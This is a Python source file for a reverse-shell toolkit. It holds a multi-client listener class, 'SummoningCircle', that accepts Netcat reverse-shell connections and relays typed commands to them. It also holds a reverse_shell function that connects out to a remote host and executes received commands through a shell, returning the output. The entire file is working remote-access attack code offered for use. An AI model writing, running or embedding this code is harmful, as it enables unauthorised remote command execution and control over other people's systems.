import socket
from select import select
from threading import Thread
from time import sleep
from subprocess import run


class SummoningCircle:
    """
    Listener designed to work with Netcat reverse shells.
    """
    def __init__(
            self,
            local_host: str = '0.0.0.0',
            local_port: int = 5000,
            command_prefix: str = '-sc',
            buffer_size: int = 1024,
            carriage_return: str = '\n',
            timeout_in_sec: int = 5
    ):

        self.local_host = local_host
        self.local_port = local_port
        self.command_prefix = command_prefix

        # Designed to be user settings down the road
        self.buffer_size = buffer_size
        self.carriage_return = carriage_return
        self.timeout_in_sec = timeout_in_sec
        self.active_client_session: int = 0

        self.server: socket = None
        self.clients = []

    def bind_socket(self) -> None:
        try:

            self.clients = []
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.local_host, self.local_port))
            self.server.listen(5)

            print(f"Listening for connection(s)...")

            while True:
                client_socket, client_address = self.server.accept()
                self.clients.append({
                    "client_nickname": client_address,
                    "client_address": client_address,
                    "client_socket": client_socket
                })

                print(f"Connection: {client_address[0]}:{client_address[1]}")

        except (KeyboardInterrupt, socket.error):
            print(f'[-] Problem encountered: {socket.error} ')

    def _shutdown(self):
        try:
            for client in self.clients:
                client['client_socket'].close()
            self.server.shutdown(socket.SHUT_RDWR)
        except (socket.error, OSError, ValueError):
            pass
        self.server.close()
        exit()

    def _view_clients(self):
        output = '[*] Summoned Connections\n\n'
        for index, client in enumerate(self.clients):
            output += f"{index}) {client['client_nickname']} -> {client['client_address']}\n"
        return output

    def _change_nickname(self, command: str):
        split_command = command.split()
        if len(split_command) > 3:
            index = int(split_command[2])
            name_change = split_command[3]
            self.clients[index]['client_nickname'] = name_change

    def _send_command(self, command: str) -> str:

        client_socket = self.clients[self.active_client_session].get('client_socket')

        client_socket.send(f"{command}{self.carriage_return}".encode())

        # Confirm data is being sent with a timeout
        ready = select([client_socket], [], [], self.timeout_in_sec)

        if ready[0]:
            return client_socket.recv(self.buffer_size).decode()

        return 'Response timed Out.'

    def interpreter(self):
        while True:
            command = input('[NC]-$ ')
            if not command.strip():
                # empty command
                continue

            if command.lower() == f'{self.command_prefix} shutdown':
                self._shutdown()
            elif command.lower() == f'{self.command_prefix} view':
                print(self._view_clients())
            elif command.lower().startswith(f'{self.command_prefix} nickname'):
                print(self._change_nickname(command=command))
            else:
                print(self._send_command(command=command))

    def start(self):
        listener = Thread(target=self.bind_socket)
        listener.start()
        sleep(1)
        self.interpreter()


def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -> None:
    """
    Opens a connection to a remote host.
    Allows remote host to execute OS commands on local system.

    Works with listener().
    """

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((remote_host, remote_port))

    while True:
        # receive the command from the server
        command = s.recv(buffer_size).decode().split()

        if command[0].lower() == "exit":
            # if the command is exit, just break out of the loop
            break

        try:
            os_call = run(command, shell=True, capture_output=True)

            if os_call.returncode == 0:
                s.send(os_call.stdout)
            else:
                s.send(os_call.stderr)
        except FileNotFoundError:
            s.send(b"Error occurred.")

    # close client connection
    s.close()


if __name__ == '__main__':
    SummoningCircle().start()
